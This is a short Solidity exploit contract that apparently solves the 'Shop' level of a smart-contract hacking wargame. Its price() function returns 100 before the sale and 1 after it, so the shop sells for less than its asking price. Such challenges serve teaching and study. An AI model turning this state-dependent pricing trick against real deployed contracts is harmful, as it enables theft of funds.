// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Shop.sol";

contract MaliciousBuyer is Buyer {
    Shop public shop;
    
    constructor(address _shop) {
        shop = Shop(_shop);
    }
    
    function price() external view override returns (uint256) {
        // If not sold yet, return high price to pass the check
        // If already sold, return low price to actually pay less
        if (!shop.isSold()) {
            return 100; // Return >= 100 to pass the initial check
        } else {
            return 1; // Return low price when actually setting the price
        }
    }
    
    function attack() external {
        shop.buy();
    }
}